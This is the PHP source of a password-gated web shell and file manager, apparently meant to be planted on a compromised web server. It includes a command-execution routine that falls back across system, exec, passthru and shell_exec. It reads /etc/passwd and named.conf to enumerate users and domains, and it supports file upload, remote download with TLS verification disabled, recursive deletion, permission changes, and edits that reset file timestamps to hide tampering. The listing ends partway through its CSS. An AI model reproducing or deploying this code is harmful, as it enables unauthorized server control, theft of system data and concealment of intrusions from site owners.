<?php
// Login
// https://codepen.io/j9159573241/pen/rNNvZRy
header("X-XSS-Protection: 0");
error_reporting(E_ALL);
ini_set("display_errors", 1);
date_default_timezone_set("Asia/Jakarta");
class auth
{
	private $password;
	protected $cookie;
	protected $post;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	function __construct($password, $expired = null)
	{
		$this->password = $password;
		$this->cookie = $_COOKIE;
		$this->post = $_POST;
	}

	public function displayLogin()
	{
		// https://codepen.io/linux/pen/jYMOBe
		?>
		<form method='post'>
			<input type='password'name='pass'>
		</form>
		<?php
	}

	public function login()
	{
		if(isset($this->password) && (trim($this->password) != '')){
			if(isset($this->post['pass'])){
				if (password_verify($this->post["pass"], $this->password)) {
					setcookie("pass", $this->password, time() + $this->expired[4], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				} else {
					echo("wrong password !");
				}
			}
			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
				$this->displayLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["pass"])) {
			setcookie("pass", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}
}

/**
 * 
 */

class hex
{
	protected static $str;
	function __construct($str)
	{
		self::$str = $str;
		return self::toHex(self::$str);
	}

	public static function toHex($string)
    {
        $str = "";
        for ($i=0; $i < strlen($string) ; $i++) { 
            $str .= dechex(ord($string[$i]));
        } return $str;
    }

    public static function toString($hex)
    {
        $unhex = "";
        for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
            $unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $unhex;
    }
}


class listFiles
{
	protected $path;
	protected $result;
	protected $getExtensionFiles;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function path()
	{
		return $this->path;
	}
	/*
	* @param: type(all|dir|file)
	*/
	public function list($type)
	{
		$this->result= [];
		foreach (@scandir($this->path()) as $key => $value) {
			$filename = [
				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
				"getName"		=> $value,
				"getSize"		=> (is_dir($value)) ? $this->countDir($value) : $this->formatSIze(@filesize($value)),
				"getPerm"		=> $this->wr($value, $this->perms($value)),
				"getTime"		=> $this->ftime($value)
			];

			switch ($type) {
				case 'all':
					if (is_dir($filename["getPathname"]));
					break;
				case "dir":
					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
						continue 2;
					}
					break;
				
				case "file":
					if (!is_file($filename["getPathname"])) {
						continue 2;
					}
					break;
			}

			$this->result[] = $filename;
		} return $this->result;
	}

	public function ftime($filename)
	{
		return date("d/m/Y H:i:s", @filemtime($filename));
	}

	public function wr($filename, $perms)
	{
		return (is_writable($filename)) ? "<font color='green'>{$perms}</font>" : "<font color='red'>{$perms}</font>";
	}

	public function perms($filename)
	{
		$perms = @fileperms($filename);

		switch ($perms & 0xF000) {
		    case 0xC000: // socket
		        $info = 's';
		        break;
		    case 0xA000: // symbolic link
		        $info = 'l';
		        break;
		    case 0x8000: // regular
		        $info = 'r';
		        break;
		    case 0x6000: // block special
		        $info = 'b';
		        break;
		    case 0x4000: // directory
		        $info = 'd';
		        break;
		    case 0x2000: // character special
		        $info = 'c';
		        break;
		    case 0x1000: // FIFO pipe
		        $info = 'p';
		        break;
		    default: // unknown
		        $info = 'u';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
		            (($perms & 0x0800) ? 's' : 'x' ) :
		            (($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
		            (($perms & 0x0400) ? 's' : 'x' ) :
		            (($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
		            (($perms & 0x0200) ? 't' : 'x' ) :
		            (($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}

	public function formatSIze($size)
	{
		if ($size < 1024) {
			return $size . " B";
		} else {
			$size = $size / 1024;
			$units = ["KB", "MB", "GB", "TB"];
			foreach ($units as $key => $value) {
				if (round($size, 2) >= 1024) {
					$size = $size / 1024;
				} else {
					break;
				}
			} return round($size, 2) . " " . $value;
		}
	}

	public function countDir($path)
	{
		return (is_writable($path)) ? count(scandir($path)) -2 . " items" : 0 . " items";
	}

	public function pwd() {
		$dir = preg_split("/(\\\|\/)/", $this->path());
		foreach ($dir as $key => $value) {
			if($value == '' && $key == 0) {
				echo '<a class="breadcrumb-close" href="?x=2f">2f</a>';
			}
			if($value == '') { 
				continue;
			}
			echo '<a class="breadcrumb-link" href="?x=';
			for ($i = 0; $i <= $key; $i++) {
				echo hex::toHex($dir[$i]); 
				if($i != $key) {
					echo '2f';
				}
			}
			print('">'.$value.'</a>');
		}
	}

	public function getIcon($filename, bool $type = true)
	{
		if ($type) {
			return "https://image.flaticon.com/icons/svg/715/715676.svg";
		} else {
			switch ($this->getExtension($filename)) {
				case 'php1':
                case 'php2':
                case 'php3':
                case 'php4':
                case 'php5':
                case 'php6':
                case 'phtml':
                case 'php':
					return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg';
					break;
				
				case 'html':
                case 'htm':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg';
                	break;
                case 'css':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg';
                	break;
                case 'js':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg';
                	break;
                case 'json':
                	return 'https://image.flaticon.com/icons/svg/136/136525.svg';
                	break;
                case 'xml':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg';
                	break;
                case 'py':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg';
                	break;
                case 'zip':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg';
                	break;
                case 'rar':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg';
                	break;
                case 'htaccess':
                	return 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
                	break;
                case 'txt':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg';
                	break;
                case 'ini':
                	return 'https://image.flaticon.com/icons/svg/1126/1126890.svg';
                	break;
                case 'mp3':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg';
                	break;
                case 'mp4':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg';
                	break;
                case 'log':
                case 'log1':
                case 'log2':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg';
                	break;
                case 'psd':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg';
                	break;
                case 'dat':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg';
                	break;
                case 'exe':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg';
                	break;
                case 'apk':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg';
                	break;
                case 'yaml':
                		return 'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png';break;
                case 'xlsx':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg';
                	break;
                case 'bak':
                	return 'https://image.flaticon.com/icons/svg/2125/2125736.svg';
                	break;
                case 'ico':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg';
                	break;
                case 'png':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg';
                	break;
                case 'jpg':
                case 'webp':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg';
                	break;
                case 'jpeg':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg';
                	break;
                case 'svg':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg';
                	break;
                case 'gif':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg';
                	break;
                case 'pdf':
                	return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg';
                	break;
                case 'asp':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg";
                	break;
                case 'doc':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg";
                	break;
                case 'docx':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg";
                	break;
                case 'otf':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg";
                	break;
                case 'ttf':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg";
                	break;
                case 'wav':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg";
                	break;
                case 'sql':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg";
                	break;
                case 'csv':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg";
                	break;
                case 'bat':
                	return "https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg";
                	break;
                default:
                	return 'https://image.flaticon.com/icons/svg/833/833524.svg';
                	break;
			}
		}
	}

	public function mySelf()
	{
		return str_replace("/", "", $_SERVER['PHP_SELF']);
	}

	public function homeroot()
	{
		return $_SERVER['DOCUMENT_ROOT'];
	}

	public function folders()
	{
		return $this->list("dir");
	}

	public function files()
	{
		return $this->list("file");
	}

	public function getExtension($filename)
	{
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}
	/*
	* @param: dir
	* @param: array
	*/
	public static function listAll($dir, &$output = array())
	{
		foreach (scandir($dir) as $key => $value) {
			$location = $dir.DIRECTORY_SEPARATOR.$value;
			if (!is_dir($location)) {
				$output[] = $location;
			} elseif ($value != "." && $value != '..') {
				self::listAll($location, $output);
				$output[] = $location;
			}
		} return $output;
	}
	/*
	* @param: dir
	* @param: file extension
	* @param: filename|filename
	*/
	public function listAllExtension($dir, $extension = null, $kecuali = "")
	{
		if (is_writable($dir)) {
			foreach ($this->listAll($dir) as $key => $value) {
				switch ($this->getExtension($value)) {
					case $extension:
						if (preg_match("/{$this->mySelf()}|{$kecuali}$/i", basename($value), $matches) === 0) {
							print($value . "<br>");
						}
						break;
				}
			}
		}
	}
}

/**
 * 
 */
class cd extends listFiles
{
	protected static $cd;
	function __construct($cd)
	{
		self::$cd = $cd;
		return self::cd(self::$cd);
	}

	public static function cd($directory)
	{
		return chdir($directory);
	}
}

/**
 * 
 */
class Tools
{
	protected $path, $name, $resource, $data = null, $cwd = null;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function make($filename)
	{
		$this->resource = $filename;
		return $this;
	}

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	public function dir()
	{
		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
	}

	public function file($data)
	{
		foreach ($this->resource as $key => $value) {
			$explode = explode("|", $this->resource[$key]);
			foreach ($explode as $i => $file) {
				file_put_contents($file, $data);
			}
		}
	}

	public function execute($command)
	{
		$command = $command;

		switch ($command) {
			case function_exists("system"):
				@ob_start();
				@system($command);
				$buff = @ob_get_contents(); 
				@ob_end_clean();
				return $buff; 	
				break;
			
			case function_exists("exec"):
				@exec($command, $result);
				$buff = "";
				foreach ($result as $key => $value) {
					$buff .= $value;
				} return $buff;
				break;

			case function_exists("passthru"):
				@ob_start();
				@passthru($command);
				$buff = @ob_get_contents();
				@ob_end_clean();
				return $buff;
				break;

			case function_exists("shell_exec"):
				$buff = @shell_exec($command);
				return $buff;
				break;
		}
	}

	public function getPasswd()
	{
		if ($this->OS() === "Linux") {
			return $this->execute("cat /etc/passwd");
		} else {
			return false;
		}
	}

	public function upload($files)
	{
		for ($i=0; $i < count($files['name']) ; $i++) { 
			move_uploaded_file($files["tmp_name"][$i], $this->cwd . DIRECTORY_SEPARATOR .$files["name"][$i]);
		}
	}
}

class Action extends Tools
{
	protected $path, $filename;
	protected $handle;
	protected $modes = [
			"read"			=> "r",
			"write" 		=> "w",
			"writemaster"	=> "w+",
			"append"		=> "a",
			"readmaster"	=> "rb"
	];
	
	function __construct($filename = null)
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->filename = $filename;
	}

	public function getUser($filename = "/etc/passwd")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all('/(.*?):x:/', $read, $matches);
				$user[] = $matches[1][0];
			} return $user;
		} else {
			return false;
		}
	}

	public function getDomian($filename = "/etc/named.conf")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all("#/var/named/(.*?).db#", $read, $matches);
				$domian[] = $matches[1][0];
			} return $domian;
		} else {
			return false;
		}
	}

	public function isWIN(bool $bool = true)
	{
		return ($bool) ? substr(strtoupper(PHP_OS), 0, 3) === "WIN" : false;
		// return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? $bool : $bool;
	}

	public function open($mode)
	{
		if (!empty(trim($this->filename))) {
			$this->handle = fopen($this->filename, $this->modes[$mode]);
			return $this;
		}
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		fwrite($this->handle, $data);
		$ftime = filemtime($this->filename);
		if ($ftime === false) return false;
		return touch($this->filename, $ftime);
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmode($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	public function validUrl($url)
	{
		if (preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $url)) {
			return true;
		}
		if (preg_match('#^([a-z][\w-]+:(?:/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))$#', $url)) {
			$parts = parse_url($url);
			if (!in_array($parts["scheme"], array( 'http', 'https' ))) {
				return false;
			}
			if (!preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $parts["host"])) {
				return false;
			}
			return true;
		}
		throw new Exception("Must be url", 1);
		
		return false;
	}

	public function downloadFileUrl($url, $filename)
	{
		if ($this->validUrl($url)) {
			$get = [
				$url,
				$filename
			];

			$handle = fopen($get[1], "w+");
			$ch = curl_init();
				  curl_setopt($ch, CURLOPT_URL, $get[0]);
				  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
				  curl_setopt($ch, CURLOPT_FILE, $handle);
			return curl_exec($ch);
				  curl_close($ch);
				  fclose($handle);
				  ob_flush();
				  flush();
		}
	}

	public function downloadFile()
	{
		$this->filename = trim($this->filename);
			if (is_file($this->filename)) {
				@header("Content-Type: application/octet-stream");
				@header('Content-Transfer-Encoding: binary');
				@header("Content-length: ".filesize($this->filename));
				@header("Cache-Control: no-cache");
				@header("Pragma: no-cache");
				@header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
				while (!feof($this->handle)) {
					print(fread($this->handle, 1024*8));
					@ob_flush();
					@flush();
				}
				fclose($this->handle);
				die();
			}
	}

	public function delete($filename)
	{
		if (is_dir($filename)) {
			foreach (scandir($filename) as $key => $value) {
				if ($value != "." && $value != "..") {
					if (is_dir($filename)) {
						$this->delete($filename . DIRECTORY_SEPARATOR . $value);
					} else {
						@unlink($filename . DIRECTORY_SEPARATOR . $value);
					}
				}
			}
			if (@rmdir($filename)) {
				return true;
			} else {
				return false;
			}
		} else {
			if (@unlink($filename)) {
				return true;
			} else {
				return false;
			}
		}
	}
}

function alert($msg, bool $bool = true)
{
	?>
	<script src="https://code.jquery.com/jquery-3.0.0.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
	<script src="https://www.jqueryscript.net/demo/Simple-Flexible-jQuery-Alert-Notification-Plugin-notify-js/js/prettify.js"></script>
	<style type="text/css">
		.notify{
			position: fixed;
			width: 400px;
			padding: 15px;
			z-index: 9999;
			border-radius: 4px;
			-webkit-border-radius: 4px;
			-webkit-transition: all .4s ease-in-out;
			-moz-transition: all .4s ease-in-out;
			-o-transition: all .4s ease-in-out;
			transition: all .4s ease-in-out;
		}
		.notify > button.close{
			position: absolute;
			top: 8px;
			right: 12px;
			-webkit-appearance: none;
			padding: 0;
			cursor: pointer;
			background: 0 0;
			border: 0;
			float: right;
			font-size: 23px;
			font-weight: 700;
			line-height: 1;
			color: #000;
			text-shadow: 0 1px 0 #fff;
			filter: alpha(opacity=20);
			opacity: .2;
			outline: none;
		}
		.notify > button.close:hover{
			filter: alpha(opacity=50);
			opacity: .5;
		}
		.notify-dismissible .message{
			padding-right: 25px;
		}

		/** animation type **/
		.notify.scale{
			-webkit-transform: scale(0.8);
			-moz-transform: scale(0.8);
			-o-transform: scale(0.8);
			transform: scale(0.8);
			opacity: 0;
		}
		.notify.left.drop{
			-webkit-transform: translateX(-50%);
			-moz-transform: translateX(-50%);
			-o-transform: translateX(-50%);
			transform: translateX(-50%);
			opacity: 0;
		}
		.notify.center.drop{
			-webkit-transform: translateY(-120%);
			-moz-transform: translateY(-120%);
			-o-transform: translateY(-120%);
			transform: translateY(-120%);
			opacity: 0;
		}
		.notify.right.drop{
			-webkit-transform: translateX(50%);
			-moz-transform: translateX(50%);
			-o-transform: translateX(50%);
			transform: translateX(50%);
			opacity: 0;
		}
		.notify.middle.center.drop{
			-webkit-transform: translateY(-20%);
			-moz-transform: translateY(-20%);
			-o-transform: translateY(-20%);
			transform: translateY(-20%);
			opacity: 0;
		}
		.notify.bottom.center.drop{
			-webkit-transform: translateY(120%);
			-moz-transform: translateY(120%);
			-o-transform: translateY(120%);
			transform: translateY(120%);
			opacity: 0;
		}
		.notify.fade{
			opacity: 0;
		}
		.notify.out{
			opacity: 0;
		}

		/** notify type **/
		.notify-default{
			background-color: #fff;
			color: #333;
			box-shadow: 0 3px 10px rgba(0,0,0,.2);
			-webkit-box-shadow: 0 3px 10px rgba(0,0,0,.2);
		}
		.notify-info{
			color: #31708f;
			background-color: #d9edf7;
		}
		.notify-toast{
			color: #fff;
			background-color: rgba(0,0,0,0.75);
		}
		.notify-danger{
			color: #a94442;
			background-color: #f2dede;
		}
		.notify-warning{
			color: #8a6d3b;
			background-color: #fcf8e3;
		}
		.notify-success{
			color: #3c763d;
			background-color: #dff0d8;
		}

		/** position **/
		.notify.top{
			top: 15px;
		}
		.notify.middle{
			top: 50%;
		}
		.notify.bottom{
			bottom: 15px;
		}
		.notify.left{
			left: 15px;
		}
		.notify.center{
			left: 50%;
			margin-left: -200px;
		}
		.notify.right{
			right: 15px;
		}

		/** buttons **/
		.notify-buttons{
			width: 100%;
			margin-top: 10px;
		}
		.notify-buttons.left{
			text-align: left;
		}
		.notify-buttons.center{
			text-align: center;
		}
		.notify-buttons.right{
			text-align: right;
		}
		.notify-buttons > button{
			border: 1px solid #ddd;
			padding: 4px 10px;
			background: #fff;
			color: #333;
			cursor: pointer;
			outline: none;
		}
		.notify-buttons > button:hover{
			background: #eee;
		}
		.notify-buttons > button:first-child{
			margin-right: 5px;
		}

		/** util **/
		.notify-backdrop{
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			bottom: 0;
			right: 0;
			z-index: 9998;
			background-color: #000;
			opacity: 0;
			-webkit-transition: opacity .4s ease-in-out;
			-moz-transition: opacity .4s ease-in-out;
			-o-transition: opacity .4s ease-in-out;
			transition: opacity .4s ease-in-out;
		}
		body.notify-open{
			overflow: hidden;
		}
		body.notify-open-drop{
			overflow-x: hidden;
		}

		@media all and (max-width:768px){
			.notify{
				width: 100%;
				left: 0!important;
				margin: 0!important;
				border-radius: 0;
				-webkit-border-radius: 0;
			}
			.notify.top{
				top: 0!important;
			}
			.notify.bottom{
				bottom: 0!important;
			}
			.notify.middle{
				width: 80%!important;
				margin-left: 10%!important;
				border-radius: 4px;
				-webkit-border-radius: 4px;
			}
			.notify.left.drop, .notify.right.drop{
				-webkit-transform: translateY(-120%);
				-moz-transform: translateY(-120%);
				-o-transform: translateY(-120%);
				transform: translateY(-120%);
			}
			.notify.bottom.drop{
				-webkit-transform: translateY(120%);
				-moz-transform: translateY(120%);
				-o-transform: translateY(120%);
				transform: translateY(120%);
				opacity: 0;
			}
		}
	</style>
	<script type="text/javascript">
		if (typeof jQuery === 'undefined') {
			throw new Error('JavaScript requires jQuery')
		}

		+function ($) {
			'use strict';
			var version = $.fn.jquery.split(' ')[0].split('.')
			if ((version[0] < 2 && version[1] < 9) || (version[0] == 1 && version[1] == 9 && version[2] < 1)) {
				throw new Error('JavaScript requires jQuery version 1.9.1 or higher')
			}
		}(jQuery);

		+function ($) {

			$.notify = function(message, options) {
				var config = $.extend(
					{
						delay: 3000,
						type: "default",
						align: "center",
						verticalAlign: "top",
						blur: 0.2,
						close: false,
						background: "",
						color: "",
						class: "",
						animation: true,
						animationType: "drop",
						icon: "",
						buttons: [],
						buttonFunc: [],
						buttonAlign: "center",
						width: "600px"
					},
					options
				);

				var animation = "";
				var buttons = "";
				var close = "";
				var closeClass = "";
				var icon = "";

				if(config.animation) { 
					animation = config.animationType;  
				} if(config.icon != "") { 
					icon = "<i class='icon fa fa-"+config.icon+"'></i>"; 
				} if(config.close || config.delay == 0) { 
					close = "<button type='button' class='close' data-close='notify' data-animation='"+animation+"'; ><span class='material-icons'>cancel</span></button>";
					closeClass = "notify-dismissible"; 
				}
				/*if(config.buttons.length != 0){
					buttons = "<div class='notify-buttons "+config.buttonAlign+"'>";
					if(config.buttonFunc.length != 0){
						if(typeof config.buttonFunc[0] != "undefined"){
							buttons += "<button type='button' onclick='"+config.buttonFunc[0]+"()'>"+config.buttons[0]+"</button>";
						}
						if(typeof config.buttonFunc[1] != "undefined"){
							buttons += "<button type='button' onclick='"+config.buttonFunc[1]+"()'>"+config.buttons[1]+"</button>";
						}else{
							if(typeof config.buttons[1] != "undefined"){ buttons += "<button type='button'>"+config.buttons[1]+"</button>"; }
						}
					}else{
						buttons += "<button type='button'>"+config.buttons[0]+"</button>";
						if(typeof config.buttons[1] != "undefined"){ buttons += "<button type='button'>"+config.buttons[1]+"</button>"; }
						
					}
					buttons += "</div>";
				}*/

		var $elem = $("<div data-animation='"+animation+"' class='notify "+config.align+" "+ config.verticalAlign+" "+animation+" "+closeClass+"'><div class='message'>"+icon+message+"</div>"+buttons+close+"</div>");
		if(config.background != "") { 
			$elem.css("background", config.background);
		} else {
			if(config.class == "") {
				$elem.addClass("notify-"+config.type);
			} else {
				$elem.addClass(config.class);
			}
		}
		if(config.color != "") { 
			$elem.css("color", config.color); 
		} if(animation == "drop") { 
			$("body").addClass("notify-open-drop"); 
		} if(config.verticalAlign == "middle") {
			$elem.css("visibility", "hidden");
			$("body").append($elem);
			$elem.css(
				{
					"margin-top":$elem.innerHeight()/2*-1,
					"visibility":"visible"
				}
			);
		} else {
			$("body").append($elem);
		}
		
		if(config.animation){
			setTimeout(function(){
				$elem.removeClass(animation);
			},100);
		}

		if(config.delay == 0) {
			var $backdrop = $("<div class='notify-backdrop'></div>");
			$("body").append($backdrop).addClass("notify-open");
			setTimeout(function() {
				$backdrop.css("opacity", config.blur);
			}, 100);
		} else {
			setTimeout(function(){
				if(config.animation){
					$elem.addClass(config.animationType);
					setTimeout(function(){
						if(config.animation == "drop"){ 
							$("body").removeClass("notify-open-drop"); 
						} $elem.remove();
					}, 400);
				} else {
					$elem.remove();
				}
			}, config.delay);
		}
	}

	$(document).on("click", ".notify-backdrop", function(e){
		hide($(".notify"));
	});
	$(document).on("click", ".notify-buttons > button", function(e){
		hide($(this).parent().parent());
	});
	$(document).on("click", "[data-close='notify']", function(e){
		hide($(this).parent());
	});

	function hide($el){
		$("body").removeClass("notify-open");
		$(".notify-backdrop").css("opacity",0);
		if($el.data("animation") != "") {
			$el.addClass($el.data("animation"));
			setTimeout(function(){
				$("body").removeClass("notify-open-drop");
				$(".notify-backdrop").remove();
				$el.remove();
			},400);
		} else {
			$(".notify-backdrop").remove();
			$el.remove();
		}
	}
}(jQuery);

	</script>
	<?php
	if ($bool === true) { ?>
		<script type="text/javascript">
			$.notify(
				"<?= $msg ?>",
				{
					blur: 0.4,
					delay: 0,
					align: "right",
					verticalAlign: "top",
					close: true,
					color: "green",
					background: "#b0f7bc"
				}
			);
		</script>
	<?php } elseif ($bool === false) { ?>
		<script type="text/javascript">
			$.notify(
				"<?= $msg ?>",
				{
					blur: 0.4,
					delay: 0,
					align: "right",
					verticalAlign: "top",
					close: true,
					color: "red",
					background: "#e08787"
				}
			);
		</script>
	<?php }
}

// Auth

$auth = new Auth('$2y$10$KT7Odax4IsjI7o1JN.iEge/s1q7yiqiG.qoONaRfaDveelqG2A8YO'); // default: (rabbitx)
$auth->login();

if (isset($_GET['x'])) {
	cd::cd(hex::toString($_GET['x']));
}
$listFiles = new listFiles;
$Tools = new Tools;

?>
<head>
	<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
	<link href="https://fonts.googleapis.com/css?family=Inter:400,800,900&display=swap" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-icons/3.0.1/iconfont/material-icons.min.css">
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
</head>
<style type="text/css">
	@import url("https://fonts.googleapis.com/css?family=Roboto&display=swap");
	/* width */
	::-webkit-scrollbar {
		width: 17px;
	}

	/* Track */
	::-webkit-scrollbar-track {
		/*background: #f1f1f1;*/
	}

	/* Handle */
	::-webkit-scrollbar-thumb {
		border: 4px solid #212F3D;
		background-color: #283747;
		border-radius:5px;
	}

	/* Handle on hover */
	::-webkit-scrollbar-thumb:hover {
		background-color: #2E4053;
		cursor: pointer;
	}

	body {
		background-color: #000;
		color: #ECF0F1;
		padding: 50px 0 50px;
		overflow: hidden;
	}

	.block {
		display: block;
		padding: 5px;
		margin-top: 6px;
	}

	.bungkus {
		max-height: 85%;
		padding-top:10px;
		overflow: auto;
	}

	.grid {
		max-width: 900px;
		margin: 0 auto;
		max-height: 100%;
		background-color: #212F3D;
		border-radius:10px;
		padding-bottom:20px;
	}

	.gutter {
		margin-left: 20px;
		margin-right: 20px;
	}
	/*.col-img {
		width: 10%;
		background-color: red;
		position: relative;
		
	}*/

	.icon {
		width: 50px;
        height: 50px;
        display: block;
        float: left;
        margin-right: 10px;
	}

	.col-10 {width: 10%;float: left;}
	.col-20 {width: 20%;float: left;}
	.col-30 {width: 30%;float: left;}
	.col-40 {width: 40%;float: left;}
	.col-50 {width: 50%;float: left;}
	.col-60 {width: 60%;float: left;}
	.col-70 {width: 70%;float: left;}
	.col-75 {width: 75%;float: left;}
	.col-80 {width: 80%;float: left;}
	.col-90 {width: 90%;float: left;}
	.col-100 {width: 100%;float: left;}

	.col-20 {
		width: 25%;
		float: left;
		padding: 15px;
	}

	.info {
		display: inline-block;
		font-size:12px;
	}

	.clear {
		clear: both;
		display: block;
	}

	.size {
		/*background-color: red;*/
		width:90px;
	}

	.perm {
		/*background-color: green;*/
		width:100px;
	}

	.time {
		/*background-color: blue;*/
		width:130px;
	}

	span.actions {
		float: left;
		margin-right: 4px;
	}

	* {
		box-sizing: border-box;
		margin: 0;
		padding: 0;
	}

	body {
		font-family: "Roboto", sans-serif;
	}

	a {
		color: #ECF0F1;
		cursor: pointer;
		text-decoration: none;
	}
	a:hover {
		color: var(--greenapple);
	}

	.nav {
		background-color: #212F3D;
		display: grid;
		border-top-left-radius: 10px;
		border-top-right-radius: 10px;
		grid-template-rows: minmax(min-content, 60px);
	}
	.nav .brand {
		color: #ECF0F1;
		cursor: pointer;
		justify-self: left;
		margin-left: 15px;
	}
	.nav .content {
		align-content: space-evenly;
		background-color: var(--greyapple);
		display: grid;
		grid-auto-flow: column;
		place-items: center;
	}
	.nav .dropdown {
		background-color: var(--darkmatter);
		display: none;
		text-align: center;
	}
	.nav .dropdown i {
		color: white;
		padding: 20px;
	}
	.nav .dropdown i:hover {
		color: var(--greyapple);
		background-color: var(--greenapple);
	}
	.nav .links {
		display: grid;
		grid-auto-columns: minmax(min-content, 50px);
		grid-auto-flow: column;
		grid-gap: 15px;
		place-items: center;
	}
	.nav .links.nav-items {
		justify-self: right;
		padding-right: 15px;
	}
	.nav .menu {
		-webkit-user-select: none;
		cursor: pointer;
		justify-self: right;
		margin-right: 20px;
		user-select: none;
		width:200px;
		text-align: right;
	}
	.nav .menu:hover {
		opacity: 0.5;
	}

	.menu {
		-webkit-user-select: none;
		cursor: pointer;
		justify-self: right;
		margin-right: 20px;
		user-select: none;
		width:95%;
		text-align: right;
	}

	textarea {
		width:100%;
		padding-top:20px;
		background-color: #212F3D;
		resize: none;
		color: #ECF0F1;
		border:none;
		outline: none;
	}

	div#nav {
		position: relative;
		justify-self: right;
	}

	div#nav a { 
		padding: 5px 15px 5px;
	}
	.dropdown-toggle { 
